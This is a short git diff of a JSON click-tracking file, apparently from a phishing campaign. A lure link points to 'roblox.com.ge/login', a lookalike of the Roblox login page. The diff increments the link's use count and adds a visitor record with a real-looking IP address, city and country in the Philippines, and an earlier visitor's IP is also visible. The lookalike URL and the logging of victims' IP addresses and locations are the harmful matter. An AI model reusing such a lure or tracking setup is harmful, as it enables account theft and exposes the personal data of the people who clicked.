@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1554,
+    "useCount": 1555,
     "createdBy": "admin",
     "clicks": [
       {
@@ -12598,6 +12598,14 @@
         "ip": "120.29.89.179",
         "country": "Philippines",
         "city": "Baguio City",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777451392021,
+        "ip": "180.191.180.68",
+        "country": "Philippines",
+        "city": "Quezon City",
         "flag": "🇵🇭",
         "countryCode": "PH"
       }
